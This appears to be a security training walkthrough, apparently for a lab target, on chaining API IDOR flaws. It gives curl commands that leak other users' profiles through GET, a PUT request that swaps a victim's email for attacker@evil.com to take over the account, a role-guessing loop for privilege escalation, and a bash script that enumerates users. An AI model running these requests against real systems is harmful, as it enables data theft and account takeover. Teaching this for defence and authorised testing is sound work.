## IDOR in Insecure APIs

API-based IDOR is more nuanced than file-based IDOR because a single API endpoint can be vulnerable in one direction but protected in another. The approach requires testing each HTTP method independently and understanding how the application's access control is structured, or specifically where it is missing. 

***

## The Two-Phase Attack Pattern

The key insight from this scenario is that write-operation IDOR (PUT/POST/DELETE) and read-operation IDOR (GET) are independently controlled. An API that correctly blocks unauthorised writes may be entirely open on GET requests, and the data leaked through GET is exactly what you need to unlock the write protections.

```
Phase 1: IDOR Information Disclosure (GET)
    Goal: Leak other users' uuid, role names, uid values
    Method: GET /api/profile/{uid} for each uid

Phase 2: IDOR Insecure Function Call (PUT)
    Goal: Modify another user's data or escalate role
    Method: PUT /api/profile/{uid} using uuid obtained in Phase 1
```

This chain works because the PUT request required a valid `uuid` to pass the server's check. That uuid is opaque from your own account's perspective, but a GET request to another user's profile may return it directly. 

***

## Phase 1: Leaking Data via GET IDOR

Test the GET method on the same API endpoint used by the PUT request:

```bash
# Your own profile (confirmed working)
curl -s -X GET "http://target.com/profile/api.php/profile/1" \
     -H "Cookie: role=employee; session=YOUR_TOKEN"

# Response:
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb"
}

# Another user's profile (IDOR test)
curl -s -X GET "http://target.com/profile/api.php/profile/2" \
     -H "Cookie: role=employee; session=YOUR_TOKEN"

# If no access control on GET:
{
    "uid": 2,
    "uuid": "4a54c7c2e23f7a6d9b3e8f1c0d5a2b7e",
    "role": "employee",
    "full_name": "John Smith",
    "email": "j_smith@employees.htb"
}
```

If the GET request returns another user's full profile including their `uuid`, the first phase is complete. You now have everything needed to craft a valid PUT request impersonating that user. 

***

## Phase 2: Using Leaked Data to Execute Function Calls

With the target user's `uuid` and `uid` in hand, the PUT request's `uuid` check can be satisfied:

```bash
# Modify another user's email (account takeover preparation)
curl -s -X PUT "http://target.com/profile/api.php/profile/2" \
     -H "Content-Type: application/json" \
     -H "Cookie: role=employee; session=YOUR_TOKEN" \
     -d '{
           "uid": 2,
           "uuid": "4a54c7c2e23f7a6d9b3e8f1c0d5a2b7e",
           "role": "employee",
           "full_name": "John Smith",
           "email": "attacker@evil.com",
           "about": "hijacked"
         }'

# If the back-end only validates uuid match but not session ownership:
# → Response: 200 OK, profile updated
# → User 2's email is now attacker@evil.com
# → Password reset to that email = full account takeover
```

***

## Role Escalation via Client-Supplied Role Field

The `role` field in the JSON body and the `role=employee` cookie both represent client-supplied values. If the back-end uses either of these to determine privilege level rather than checking against a server-side session record, you can escalate by changing the value:

```bash
# Enumerate valid role names first (error messages reveal valid/invalid roles)
# Test common names to find what the application accepts:
for role in admin administrator superuser manager hr_admin; do
    response=$(curl -s -X PUT "http://target.com/profile/api.php/profile/1" \
         -H "Content-Type: application/json" \
         -H "Cookie: role=employee; session=YOUR_TOKEN" \
         -d "{\"uid\":1,\"uuid\":\"40f5888b67c748df7efba008e7c2f9d2\",\"role\":\"$role\",\"full_name\":\"Amy Lindon\",\"email\":\"a_lindon@employees.htb\",\"about\":\"test\"}")
    echo "$role → $response"
done

# Look for responses that differ from "Invalid role" to identify valid role names
# If another user's GET profile reveals role="admin", that is the valid role name
```

Once a valid admin role name is identified from a leaked GET response, submit it in your own PUT request:

```bash
curl -s -X PUT "http://target.com/profile/api.php/profile/1" \
     -H "Content-Type: application/json" \
     -H "Cookie: role=admin; session=YOUR_TOKEN" \
     -d '{
           "uid": 1,
           "uuid": "40f5888b67c748df7efba008e7c2f9d2",
           "role": "admin",
           "full_name": "Amy Lindon",
           "email": "a_lindon@employees.htb",
           "about": "escalated"
         }'
```

***

## Mass API Enumeration Script

Automate both phases to enumerate all users and collect their data in one pass:

```bash
#!/bin/bash

TARGET="http://target.com/profile/api.php/profile"
COOKIE="Cookie: role=employee; session=YOUR_SESSION_TOKEN"
OUTPUT="user_data.json"
echo "[]" > "$OUTPUT"

for uid in {1..50}; do
    response=$(curl -s -X GET "$TARGET/$uid" -H "$COOKIE")
    
    # Check if response contains valid user data
    if echo "$response" | grep -q '"uuid"'; then
        echo "[+] UID $uid: $(echo $response | python3 -m json.tool 2>/dev/null | grep full_name)"
        
        # Append to output file
        echo "$response" >> "uid_${uid}.json"
        
        # Extract uuid for potential phase 2 use
        uuid=$(echo "$response" | grep -oP '"uuid"\s*:\s*"\K[^"]+')
        role=$(echo "$response" | grep -oP '"role"\s*:\s*"\K[^"]+')
        email=$(echo "$response" | grep -oP '"email"\s*:\s*"\K[^"]+')
        
        echo "    UUID: $uuid | Role: $role | Email: $email"
    else
        echo "[-] UID $uid: no data or access denied"
    fi
done
```

***

## Identifying Hidden Parameters in API Requests

The `role`, `uuid`, and `uid` fields were hidden parameters not exposed in the visible HTML form. Finding these requires intercepting the actual API request rather than reading the page source: 

```
Method 1: Burp Proxy
    Intercept every request during normal application use
    Compare what the HTML form shows vs what the API actually sends
    Note any parameters in the API that are not in the form

Method 2: Browser DevTools Network Tab
    Filter by XHR/Fetch requests
    Click each request to see full request body
    Parameters not in the visible form are hidden API fields

Method 3: JavaScript Source Analysis
    Search for the API endpoint URL (e.g. /profile/api.php)
    Find all parameters being passed to that endpoint
    Any parameter the front-end sends is potentially manipulable
```

Hidden parameters like `role` in API requests are especially valuable because they represent functionality the developer intentionally built but assumed would be safe since the front-end never exposes it. The back-end assumption that these parameters cannot be tampered with is the exact vulnerability being exploited. 
